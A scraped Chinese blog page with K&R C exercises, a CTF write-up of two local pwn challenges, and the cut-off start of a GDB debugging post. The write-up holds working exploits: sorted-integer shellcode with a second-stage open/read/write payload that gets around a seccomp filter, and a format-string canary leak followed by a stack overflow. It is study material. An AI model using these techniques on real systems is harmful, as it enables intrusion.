123456789// hash函数, 为字符串s生成散列值unsigned hash(char *s)&#123;    unsigned hashval;        for(hashval=0; *s !=&#x27;\0&#x27;;s++)        hashval = *s + 31* hashval;  //数字的相加    return hashval % HASHSIZE:&#125;

​		查找函数
12345678struct nlist *lookup(char *s)&#123;    struct nlist *np;    for (np = hashtab[hash(s)]; np != NULL; np = np-&gt;next)        if (strcmp(s, np-&gt;name) == 0)            return np;    return NULL;&#125;

​		加入函数
123456789101112131415161718192021struct nlist *lookup(char *s);char *strdup(char *);struct nlist *install(char *name, char *defn)&#123;    struct nlist *np;    unsigned hashval;        if((np = lookup(name)) == NULL)&#123;//未找到        np = (struct nlist *) malloc(sizeof(*np));        if (np == NULL || (np-&gt;name = strdup(name)) == NULL)            return NULL;        hashval = hash(name);        np-&gt;next = hashtab[hashval]; //头插,        hashtab[hashval] = np;           &#125;else        free((void *)np-&gt;defn)    if((np-&gt;defn = strdup(defn)) == NULL)        return NULL    return np;&#125;



​		整合
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;struct nlist&#123; //链表项    struct nlist *next; //链表中下一个表项    char *name;			//定义的名字    char *defn;			//替换文本&#125;;#define HASHSIZE 101static struct nlist *hashtab[HASHSIZE]; //指针表struct nlist *lookup(char *s);char *strdup1(char *);unsigned hash(char *s);struct nlist *install(char *name, char *defn);int main()&#123;    printf(&quot;1.add\n&quot;);        char *name,*defn;    name = (char *)malloc(100);    defn = (char *)malloc(100);    if (name == NULL || defn == NULL)&#123;		printf(&quot;内存分配失败\n&quot;);        return 1;    &#125;        while(1)&#123;        printf(&quot;请输入名字和替换的名字&quot;);        scanf(&quot;%s %s&quot;,name,defn);//这直接用是不对的,需要分配内存        install(name,defn);    &#125;    free(name);    free(defn);    return 0;    &#125;// hash函数, 为字符串s生成散列值unsigned hash(char *s)&#123;    unsigned hashval;        for(hashval=0; *s !=&#x27;\0&#x27;;s++)        hashval = *s + 31* hashval;  //数字的相加    return hashval % HASHSIZE;&#125;struct nlist *lookup(char *s)&#123;    struct nlist *np;    for (np = hashtab[hash(s)]; np != NULL; np = np-&gt;next)        if (strcmp(s, np-&gt;name) == 0)            return np;    return NULL;&#125;struct nlist *install(char *name, char *defn)&#123;    struct nlist *np;    unsigned hashval;        if((np = lookup(name)) == NULL)&#123;//未找到        np = (struct nlist *) malloc(sizeof(*np));        if (np == NULL || (np-&gt;name = strdup(name)) == NULL)            return NULL;        hashval = hash(name);        np-&gt;next = hashtab[hashval]; //头插,        hashtab[hashval] = np;           &#125;else        free((void *) np-&gt;defn);    if((np-&gt;defn = strdup1(defn)) == NULL)        return NULL;    return np;&#125;char *strdup1(char *s)&#123;    char *p;        p = (char *) malloc(strlen(s)+1);//+1是因为结尾要加\0    if (p != NULL)        strcpy(p,s);    return p;&#125;





6.7 6.8  类型定义(typedef)、位字段第七章 输入与输出7.1 标准输入输出12345678910111213//用于将输入转换为小写字母的形式#include &lt;stdio.h&gt;#include &lt;ctype.h&gt;int main()&#123;    int c;        while ((c = getchar()) != EOF)        putchar(tolower(c));    return 0;&#125;



7.2 格式化输出 printf函数123456789#include &lt;stdio.h&gt;int main()&#123;    char *s =  &quot;hello,lihua&quot;;    printf(s); //格式化字符串漏洞不就是这么来的嘛...    printf(&quot;\n&quot;);    printf(&quot;%s\n&quot;,s);&#125;





7.3 变长参数表1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdarg.h&gt;void minprintf(char *fmt, ...)&#123;    va_list ap;    char *p, *sval;    int ival;    double dval;        va_start(ap, fmt);    for (p= fmt; *p; p++)    &#123;        if( *p!=&#x27;%&#x27;)&#123; //为啥只取一个字符呢            putchar(*p);            continue;        &#125;        switch(*++p)&#123;            case &#x27;d&#x27;:                ival = va_arg(ap,int);                printf(&quot;%d&quot;, ival);                break;            case &#x27;f&#x27;:                dval = va_arg(ap, double);                printf(&quot;%f&quot;,dval);             	break;            case &#x27;s&#x27;:                for (sval = va_arg(ap, char *); *sval; sval++)                    putchar(*sval);                break;            default:                putchar(*p);                break;        &#125;    &#125;    va_end(ap);&#125;int main()&#123;    minprintf(&quot;hello,wolrd:%d,%s\n&quot;,1,&quot;ooo&quot;);&#125;



7.4 格式化输入 scanf函数1234567891011#include &lt;stdio.h&gt;int main()&#123;    double sum, v;        sum = 0 ;    while( scanf(&quot;%lf&quot;, &amp;v) == 1)        printf(&quot;\t%.2f\n&quot;,sum+=v);    return 0;&#125;



12345678910#include &lt;stdio.h&gt;int main()&#123;    int day,month,year;	    scanf(&quot;%d/%d/%d&quot;,&amp;month,&amp;day,&amp;year);    printf(&quot;%d年%d月%d日\n&quot;,year,month,day);    return 0;&#125;





7.5 文件访问​	这里和pwn的iofile关系很大
1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123;    FILE *fp;    void filecopy(FILE *, FILE *);        if (argc == 1) filecopy(stdin,stdout); //没有命令行参数、复制标准输入    else        while(--argc &gt; 0)            if((fp = fopen(*++argv,&quot;r&quot;)) == NULL)&#123;				printf(&quot;cat: can&#x27;t open %s\n&quot;,*argv);                return 1;            &#125;else&#123;                filecopy(fp,stdout);                fclose(fp);            &#125;    return 0;&#125;// 将文件ifp复制到文件ofpvoid filecopy(FILE *ifp,FILE *ofp)&#123;    int c;    while( (c = getc(ifp))!=EOF)        putc(c,ofp);&#125;

​	gdb调试一下 , 可以结合之前看的open什么的那个链来学习一下		
7.6 错误处理​	增加了stderr
123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;  // exit函数int main(int argc, char *argv[])&#123;    FILE *fp;    void filecopy(FILE *, FILE *);    char *prog = argv[0];        if (argc == 1) filecopy(stdin,stdout);    else        while(--argc &gt; 0)            if((fp = fopen(*++argv,&quot;r&quot;)) == NULL)&#123;				fprintf(stderr,&quot; %s:  can&#x27;t open %s\n&quot;,prog,*argv);                exit(1);            &#125;else&#123;                filecopy(fp,stdout);                fclose(fp);            &#125;   	if (ferror(stdout))    &#123;        fprintf(stderr,&quot;%s: error writing stdout\n&quot;, prog);        exit(2);    &#125;    exit(0);&#125;// 将文件ifp复制到文件ofpvoid filecopy(FILE *ifp,FILE *ofp)&#123;    int c;    while( (c = getc(ifp))!=EOF)        putc(c,ofp);&#125;





7.7 行输入和行输出7.8 特别有用的函数(更详细的在附录b中)EOF与空白符号的区别
这是空白符号, EOF是-1
123456&#x27; &#x27;     (0x20)	space (SPC) 空格符&#x27;\t&#x27;	(0x09)	horizontal tab (TAB) 水平制表符	&#x27;\n&#x27;	(0x0a)	newline (LF) 换行符&#x27;\v&#x27;	(0x0b)	vertical tab (VT) 垂直制表符&#x27;\f&#x27;	(0x0c)	feed (FF) 换页符&#x27;\r&#x27;	(0x0d)	carriage return (CR) 回车符







12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;	FILE *fp;	int c;    fp = fopen(&quot;./flag&quot;,&quot;r&quot;);	//write(1,fp,20);	while(1)	&#123;		c = fgetc(fp);		if(feof(fp)) break;		printf(&quot;%c&quot;,c);	&#125;	fclose(fp);	return 0;&#125;









</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-45-10%E6%9C%88%E6%9C%88%E8%B5%9B%E4%B8%A4%E9%A2%98/" title="pwn入门-45-10月月赛两题">pwn入门-45-10月月赛两题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-30T13:15:56.000Z" title="发表于 2023-10-30 21:15:56">2023-10-30</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-16T09:26:51.858Z" title="更新于 2023-11-16 17:26:51">2023-11-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">题目文件: 本链接+.&#x2F;sorted  .&#x2F;ezpwn
总结下来就是基础太不牢固了，很多小点都不清楚，浪费时间，每次遇到后都要尽量及时解决，查缺补漏。
sorted123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123;  int i; // [rsp+0h] [rbp-10h]  int j; // [rsp+4h] [rbp-Ch]  void *dest; // [rsp+8h] [rbp-8h]  sandbox();  puts(&quot;Just give you ten seconds before you DIE!&quot;);  dest = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);  for ( i = 10; i &gt; 0; --i )  &#123;    printf(&quot;%d!\n&quot;, (unsigned int)i);    scanf(&quot;%d&quot;, &amp;DIEnum[i]);  &#125;  puts(&quot;Before you die,I must do something.&quot;);  std::sort&lt;int *&gt;(&amp;unk_203044, &amp;unk_20306C);  puts(&quot;let&#x27;s see what&#x27;U have said&quot;);  for ( j = 1; j &lt;= 10; ++j )    printf(&quot;%d\n&quot;, DIEnum[j]);  puts(&quot;Hahahahahaha!Now,taste the fear&quot;);  memcpy(dest, DIEnum, 0x100uLL);  ((void (*)(void))dest)();  return 0;&#125;





12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;bits/stdc++.h&gt;#include&lt;sys/prctl.h&gt;#include&lt;linux/seccomp.h&gt;#include&lt;linux/filter.h&gt;#include&lt;unistd.h&gt;#include &lt;sys/mman.h&gt;int DIEnum[20];void sandbox()&#123;  struct sock_filter filter[] = &#123;    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4),    BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2),    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),    BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),    &#125;;    struct sock_fprog prog = &#123;    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),    .filter = filter,    &#125;;    prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);&#125;int main()&#123;  sandbox();  puts(&quot;Just give you ten seconds before you DIE!&quot;);  char* v1=(char *)mmap(0,0x1000,7,34,-1,0ll);  for(int i=10;i&gt;=1;--i)&#123;    printf(&quot;%d!\n&quot;,i);    scanf(&quot;%d&quot;,&amp;DIEnum[i]);  &#125;  puts(&quot;Before you die,I must do something.&quot;);  std::sort(DIEnum+1,DIEnum+11);  puts(&quot;let&#x27;s see what&#x27;U have said&quot;);  for(int i=1;i&lt;=10;++i)&#123;    printf(&quot;%d\n&quot;,DIEnum[i]);  &#125;  puts(&quot;Hahahahahaha!Now,taste the fear&quot;);  memcpy(v1,DIEnum,0x100);  ((void (*) (void)) v1)();  return 0;&#125;







题目分析​		打眼一看就发现是一个排序，但是由于自己对端续、有符号数、内存值等一些概念不清楚、晕乎了很常见。
​		首先这道题并不是要找一个最小化的shellcode，直接拿shell（应该是可以绕过的把，），因为排序的因素，直接拿shell排序会比较难，不如先read进来，没限制了，再干其他的。
沙箱​	有沙箱保护 seccomp-tools dump .&#x2F;rop
execve类似的还有吧    execveat
123456789 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005 0004: 0x06 0x00 0x00 0x00000000  return KILL 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW



 if (A &gt;&#x3D; 0x40000000) goto 0006 没有这个哦
https://www.anquanke.com/post/id/219077






http://shell-storm.org/shellcode/files/shellcode-905.html
​	这里有一个比较短的execveat的shellcode，但是，仍然比较难排序，因为指令太多了，而且有个长指令必须连起来
如果不绕过的话就 orw了
对 ((void (*)(void))dest)()的理解dest怎么理解呢，（还好要到了原题，不然。。也可以自己再写一遍的。。都问题不大，多动手！）
​	其实就是存放的shellcode的地址，然后当成函数，直接调用这个位置的指令，（就是函数指针）
​	((void (*)(void))dest)() ， 将dest转换为一个函数指针 ，函数不带参数，且无返回值
call  rax, 然后就可以执行shellcode吗
​	rax里存放的是shellcode那里的起始地址，也就是将要执行的指令的地址，call会做两件事，一件是把当前的下一条指令压栈，另外一件是把rax指向的地址赋值给rip（类似于jmp）
思路​	长度还有限制，所以应该是先通过一个read片段，把后续代码读入mmap的空间（不会受排序影响），然后再跳转过去即可。
​	注意可以利用的信息,rdi存储着mmap的地址,可以利用
​	这里有个细节，读入的地址不要和要执行的jmp重合， 很容易覆盖到jmp那里,影响指令，所以需要往后写，比如rdi+0x100
shellcode 排序64位系统调用规则: rax是系统调用号，参数和函数的一样，rdi、rsi、rdx。。
00也会被解释的，所以需要补齐，用0x90 nop  0xfc cld这种指令,并且可以利用他们来调整顺序
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657read(0,buf,0x100)    48 8b df        mov rbx,rdi //把要写的地址传给rbx（因为rbx在其他地方用不到）31 d2           xor edx,edx //为什么不是rdx呢b6 01           mov dh,0x1   //一方面设置第三个参数 0x100，也就是read的大小，48 01 d3        add rbx,rdx //另一方面可以让rbx+0x100，31 C0           xor eax,eax  //为什么不是rax,  read系统调用号是031 ff           xor edi,edi  // 第一个参数0 ，标准输入48 89 de        mov rsi,rbx //第二个参数，buf地址0f 05           syscallff e6           jmp rbx //跳转到后续shellcode地址 所以问什么不48 89 fe        mov rsi,rdi //把要写的地址传给rbx（因为rbx在其他地方用不到）31 d2           xor edx,edxb6 01 	 		mov dh,0x1   //一方面设置rdx为0x100，也就是read的大小，48 01 d6		add rsi,rdx //另一方面可以让rbx+0x100，31 C0           xor eax,eax  31 ff           xor edi,edi  // 第一个参数0 ，标准输入0f 05           syscallff e6           jmp rsi //跳转到后续shellcode地址        注意字节序是反的        0xfe89480xd2310x01b60xd601480xc0310xff310x050f0xe6ff        排序有几个注意点1.负数是自身绝对值越大， 数值越大吗。。(是的把，按位取反加1，看起来越大的值，补码越小，再加符号，越大，)（有空再看看。。2.谁必须在谁前面  一个90，一个fc就可以保证了3.syscall和jmp rsi必须在最后（fcfc就可以保证了，其他的最大fc90）        0x90fe89480x9090d2310x90fc01b60xfcd601480xfc90c0310xfc90ff310xfcfc050f0xfcfce6ff0x7fffffff0x7fffffff        -1869557199 -1862532682 -1862366904 -57622479 -57606351 -53083832 -50592497 -50534657 2147483647 2147483647





同学的:




写一个脚本辅助生成(其实就是模拟题目)   这里是不是可以用cap那个工具 显示指令(埋个坑吧)、以及连起来更多的,一键生成exp
12345678910111213141516171819202122232425262728#include &lt;bits/stdc++.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;int DIEnum[20];int main()&#123;    puts(&quot;10&quot;);    char* v1=(char *)mmap(0,0x1000,7,34,-1,0ll);    for (int i=0;i&lt;=9;i++)&#123;		scanf(&quot;%x&quot;,&amp;DIEnum[i]);    &#125;    printf(&quot;未排序前结果：\n&quot;);    for (int i=0;i&lt;=9;i++)&#123;		printf(&quot;%d\n&quot;,DIEnum[i]);    &#125;    std::sort(DIEnum,DIEnum+10);    printf(&quot;排序后结果：\n&quot;);    for (int i=0;i&lt;=9;i++)&#123;		printf(&quot;0x%-16x          %d\n&quot;,DIEnum[i],DIEnum[i]);    &#125;     printf(&quot;输入的值：\n&quot;);    for (int i=0;i&lt;=9;i++)&#123;		printf(&quot;%d &quot;,DIEnum[i]);    &#125;        return 0;&#125;





二段shellcode这里应该就随意了,生成一个orw的就可以了
1234567891011121314from pwn import *# 设置目标架构为x86-64context.arch = &#x27;amd64&#x27;# 默认的是大端序，可以修改context.endian = &#x27;little&#x27;shellcode = shellcraft.open(&quot;./flag&quot;)shellcode += shellcraft.read(&quot;rax&quot;,&quot;rsp&quot;,100)shellcode += shellcraft.write(1,&quot;rsp&quot;,100)print(asm(shellcode))





最终exp123456789101112131415161718192021222324252627282930from pwn import *# 设置目标架构为x86-64context.arch = &#x27;amd64&#x27;# 默认的是大端序，可以修改context.endian = &#x27;little&#x27;io = process(&#x27;./sorted&#x27;)context(os=&#x27;linux&#x27;,log_level=&quot;debug&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(io)io.sendline(b&#x27;-1869557199 -1862532682 -1862366904 -57622479 -57606351 -53083832 -50592497 -50534657 2147483647 2147483647&#x27;)#pause()&#x27;&#x27;&#x27;sc_elf = ELF(&#x27;b.out&#x27;)sc = sc_elf.get_section_by_name(&#x27;.shellcode&#x27;).data()print(sc)&#x27;&#x27;&#x27;sc = b&#x27;hflagH\x89\xe71\xd21\xf6j\x02X\x0f\x05\x89\xc71\xc0j ZH\x89\xe6\x0f\x05j\x01_j ZH\x89\xe6j\x01X\x0f\x05\xcc&#x27;#pause()shellcode = shellcraft.open(&quot;./flag&quot;)shellcode += shellcraft.read(&quot;rax&quot;,&quot;rsp&quot;,100)shellcode += shellcraft.write(1,&quot;rsp&quot;,100)io.send(flat(&#123;    0: asm(shellcode),    0x100: [],&#125;))io.interactive()









各种疑惑问: 为什么-490631024 读入内存会成为 0xe2c19090
答: 负数会采用补码来存储
问: 为什么前期用python得到的数 输入进去奇奇怪怪
答:0xfcffffff scanf %d 读取的时候，会解释为负数，所以 不能用python里的直接数值转换来得到题目要输入的值（怪不得前期一直不对。。）
12345678910value = 0xfcffffff if 0xfcffffff &lt; 0x80000000 else 0xfcffffff - 0x100000000print(value)这样就对了或者import structdata = struct.pack(&quot;I&quot;, 0xfcffffff)  # 将无符号整数打包为二进制数据value = struct.unpack(&quot;i&quot;, data)[0]  # 将二进制数据解析为有符号整数print(value)





怎么比较好的在gdb中查看shellcode的汇编呢
display &#x2F;20i $pc
https://blog.csdn.net/counsellor/article/details/100034080
https://amritabi0s.wordpress.com/2017/10/23/hack-lu-ctf-bit-writeup/
pwntools的使用123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *# 设置目标架构为x86-64context.arch = &#x27;amd64&#x27;# 默认的是大端序，可以修改context.endian = &#x27;little&#x27;shellcode = shellcraft.sh()  # 指令字符串shellcodeasm = asm(shellcraft.sh()) # 二进制数据# 使用 disasm 函数查看每一行汇编指令的十六进制值disassembled = disasm(shellcodeasm)# 分割每一行汇编指令instructions = disassembled.split(&#x27;\n&#x27;)# 打印每一行指令及其十六进制值for instruction in instructions:    print(instruction)# 打印整个shellcode的十六进制值print(shellcodeasm.hex())# 如何打印指定汇编指令的16进制值assembly_code = &quot;mov eax,0x123&quot;hex_assembly = asm(assembly_code)hex_assembly_code = asm(assembly_code).hex()hex_assembly_1 = disasm(hex_assembly)print(f&quot;汇编指令二进制表示: &#123;hex_assembly&#125;&quot;)print(f&quot;汇编指令的十六进制表示: &#123;hex_assembly_code&#125;&quot;)print(f&quot;汇编指令: &#123;hex_assembly_1&#125;&quot;)##  shellcraft的各种使用方法shellcraft.read()





pwn asm汇编器
https://leeyuxun.github.io/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html
https://zero-mk.github.io/2019/01/01/pwntools-Command%20Line%20Tools/
123pwn asm &quot;mov eax,0x1&quot;b801000000    



ez_pwn1234567891011121314151617int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[32]; // [rsp+0h] [rbp-30h] BYREF  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword(0x28u);  puts(&quot;input your name&quot;);  fflush(_bss_start);  read(0, buf, 0x20uLL);  puts(&quot;hello: &quot;);  fflush(_bss_start);  printf(buf);  puts(&quot;leave some message&quot;);  fflush(_bss_start);  read(0, buf, 0x48uLL);  return 0;&#125;

​	主要是有个canary,把canary泄露出来就可以了,普通栈溢出，利用格式化字符串来泄露canary，注意前六个参数是在寄存器里的值呀。
​	然后接收的时候注意先把hello：什么的接收了，
1234567891011[DEBUG] Received 0x10 bytes:    b&#x27;input your name\n&#x27;[DEBUG] Sent 0x6 bytes:    b&#x27;%11$p\n&#x27;b&#x27;\n&#x27;[DEBUG] Received 0x2e bytes:    b&#x27;hello: \n&#x27;    b&#x27;0x2535be38a9253e00\n&#x27;    b&#x27;leave some message\n&#x27;b&#x27;hello: \n&#x27;



exp12345678910111213141516171819202122232425from pwn import *context(os=&#x27;linux&#x27;,log_level=&quot;debug&quot;)p = process(&quot;ezpwn&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(p)p.recvuntil(&quot;name&quot;)#p.sendline(b&quot;a&quot;*32)p.sendline(b&quot;%11$p&quot;)print(p.recvline())print(p.recvline())canary = int(p.recvline()[:-1],16)print(&quot;canary:&quot;,hex(canary))print(&quot;canary:&quot;,canary)#pause()p.recvuntil(&quot;message&quot;)payload = b&quot;a&quot;*40 +p64(canary) + p64(0x123456) + p64(0x4012b0)+p64(0x4011d6)#pause()p.send(payload)#pause()p.recv(1024)p.interactive()











关于格式化字符串传参：传递10个参数看看
12345#include &lt;stdio.h&gt;void main()&#123;    printf(&quot;1:%s 2:%s 3:%s 4:%s 5:%s 6:%s 7:%s 8:%s 9:%s\n&quot;,&quot;1aaa&quot;,&quot;2bbb&quot;,&quot;3ccc&quot;,&quot;4ddd&quot;,&quot;5eee&quot;,&quot;6fff&quot;,&quot;7ggg&quot;,&quot;8hhh&quot;,&quot;9iii&quot;);&#125;



​	rdi、rsi、rdx、rcx、r8、r9
​	可以看到前5个在寄存器,后面在栈里,从rsp开始
12345678910111213141516171819202122232425262728*RAX  0x0 RBX  0x5555555551b0 (__libc_csu_init) ◂— endbr64 RCX  0x555555556012 ◂— 0x6262320063636333 /* &#x27;3ccc&#x27; */ RDX  0x555555556017 ◂— 0x6161310062626232 /* &#x27;2bbb&#x27; */ RDI  0x555555556028 ◂— &#x27;1:%s 2:%s 3:%s 4:%s 5:%s 6:%s 7:%s 8:%s 9:%s\n&#x27; RSI  0x55555555601c ◂— 0x61616131 /* &#x27;1aaa&#x27; */ R8   0x55555555600d ◂— 0x6363330064646434 /* &#x27;4ddd&#x27; */ R9   0x555555556008 ◂— 0x6464340065656535 /* &#x27;5eee&#x27; */ R10  0x3 R11  0x0 R12  0x555555555060 (_start) ◂— endbr64 R13  0x7fffffffe5a0 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffe4b0 ◂— 0x0 RSP  0x7fffffffe490 —▸ 0x555555556065 ◂— 0x100000066666636 /* &#x27;6fff&#x27; */*RIP  0x5555555551a0 (main+87) ◂— call 0x555555555050            00:0000│ rsp 0x7fffffffe490 —▸ 0x555555556065 ◂— 0x100000066666636 /* &#x27;6fff&#x27; */01:0008│     0x7fffffffe498 —▸ 0x555555556060 ◂— 0x6666360067676737 /* &#x27;7ggg&#x27; */02:0010│     0x7fffffffe4a0 —▸ 0x55555555605b ◂— 0x6767370068686838 /* &#x27;8hhh&#x27; */03:0018│     0x7fffffffe4a8 —▸ 0x555555556056 ◂— 0x6868380069696939 /* &#x27;9iii&#x27; */04:0020│ rbp 0x7fffffffe4b0 ◂— 0x005:0028│     0x7fffffffe4b8 —▸ 0x7ffff7de4083 (__libc_start_main+243) ◂— mov edi, eax06:0030│     0x7fffffffe4c0 —▸ 0x7ffff7ffc620 (_rtld_global_ro) ◂— 0x50f7a0000000007:0038│     0x7fffffffe4c8 —▸ 0x7fffffffe5a8 —▸ 0x7fffffffe7f4 ◂— &#x27;/home/ubuntu/c/a.out&#x27;







问题类似的题
https://blog.csdn.net/tbsqigongzi/article/details/124371294
这个为什么进入ret了,但是失败了? ret栈平衡?
  fflush(_bss_start);有什么用呢
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/" title="盛格塾课程-拍案惊奇GDB以战说法1-谁截断了我的指针?">盛格塾课程-拍案惊奇GDB以战说法1-谁截断了我的指针?</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-26T13:54:31.000Z" title="发表于 2023-10-26 21:54:31">2023-10-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-26T13:55:55.858Z" title="更新于 2023-10-26 21:55:55">2023-10-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/PWN/%E8%B0%83%E8%AF%95/">调试</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E8%B0%83%E8%AF%95/">调试</a></span></div><div class="content">前言​	之前知道老师是因为《软件调试》这本书，非常厉害，但是因为主要是windows的一直还没读（因为主要学习Linux，不过最近越发感觉不能局限于一个系统），最近看见一个大佬在朋友圈转发这个课，才发现张老师原来是有自己的公司和培训，看了下来太牛了，立马报名了。
​	(老师b站也有号, 官网nanocode.cn,) 还有其他很多优秀的课程,看来要好好买一波了..这才是真正有价值的知识付费!!
背景​	老师将实际案例中的一个问题抽象出了一个很简单的demo, 用于搜索argv[0]的名字, 其实也就是当前可执行程序的名字,本身看着这个代码是没有什么问题的(不,有问题,没有include parser.c)
parser.c
123456789// parser.c#include &lt;string.h&gt;const char * get_name(const char* full_path)&#123;	const char * sep = strrchr(full_path, &#x27;/&#x27;);	return (sep == NULL)? &quot;errname&quot;: sep+1;	&#125;

ptrtrap.c
123456789101112#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;	char* name = get_name(argv[0]);	printf(&quot;Demo of pointer trap by Raymond.\n&quot;);	printf(&quot;Name: %s\n&quot;, name);		return 0;&#125;

​	在编译的时候会给出一个警告
gcc -g ptrtrap.c parser.c
1234567root@VM-4-8-ubuntu:/home/ubuntu/youlan# gcc -g ptrtrap.c parser.cptrtrap.c: In function ‘main’:ptrtrap.c:5:22: warning: implicit declaration of function ‘get_name’; did you mean ‘rename’? [-Wimplicit-function-declaration]    5 |         char* name = get_name(argv[0]);      |                      ^~~~~~~~      |                      renameptrtrap.c:5:22: warning: initialization of ‘char *’ from ‘int’ makes pointer from integer without a cast [-Wint-conversion]

​	运行的时候会发生段错误
Program received signal SIGSEGV, Segmentation fault
段错误，访问了不该访问的

调试分析回溯粗看​	朱熹的不远复:“不远复”，出自《易经》“不远之复，以修身也”。和孔子的吾日三省吾身有异曲同工之妙,人要不断反思自己,反省走的路.
​	bt命令回溯 调用栈 , 库函数一般都经过很多修改和测试、一般没问题，所以更多的还是自己写的代码的问题

​	可以减少bt的显示，如 bt -frame-info short-location 不带源代码位置
​	frame 3查看自己写的函数里的栈帧的情况, list查看源代码， 这样就能够看到上下文， disass查看汇编

​	所以能够看到问题是在 call  printf这里，产生了问题, 也就是传入的name有问题
​	问: __printf为什么带下划线？
​	答: 因为__printf是libc实现的，   _ _通常是编译器的函数 编译器的优化？
​	info shared查看进程里的库, ld负责把程序从外存搬运到内存, libc负责实现标准库函数
1234pwndbg&gt; info sharedFrom                To                  Syms Read   Shared Object Library0x00007ffff7fc5090  0x00007ffff7fee315  Yes         /lib64/ld-linux-x86-64.so.20x00007ffff7daf700  0x00007ffff7f41b3d  Yes         /lib/x86_64-linux-gnu/libc.so.6



函数从哪里开始执行？​	elf从哪里开始呢，不是main 是_start(), bt有个选项 -past-main查看main函数之前的,有的默认开启了
__libc_start_call_main 用来做准备工作？
细看崩溃指令​	来到崩溃的那一行汇编来看看什么情况,这里指向的含义是 尝试执行这条指令，但是失败了

vpcmpeqb指令
​	[rdi]是引用内存, 此时的rdi的值是0xffffffffffffe7db,我们来看一下内存的情况,用info inferiors命令,查看进程,然后从proc里看内存(pwndbg可以直接vmmap)
​	从这里看地址就能看出来，是无效地址, 用户空间的大小早超了(所以说每个细节都需要关注)
123456789101112131415161718192021222324252627pwndbg&gt; info inferiors  Num  Description       Connection           Executable* 1    process 1269337   1 (native)           /home/ubuntu/youlan/a.outpwndbg&gt; !cat /proc/1269337/maps555555554000-555555555000 r--p 00000000 fc:02 822041                     /home/ubuntu/youlan/a.out555555555000-555555556000 r-xp 00001000 fc:02 822041                     /home/ubuntu/youlan/a.out555555556000-555555557000 r--p 00002000 fc:02 822041                     /home/ubuntu/youlan/a.out555555557000-555555558000 r--p 00002000 fc:02 822041                     /home/ubuntu/youlan/a.out555555558000-555555559000 rw-p 00003000 fc:02 822041                     /home/ubuntu/youlan/a.out555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]7ffff7d84000-7ffff7d87000 rw-p 00000000 00:00 07ffff7d87000-7ffff7daf000 r--p 00000000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.67ffff7daf000-7ffff7f44000 r-xp 00028000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.67ffff7f44000-7ffff7f9c000 r--p 001bd000 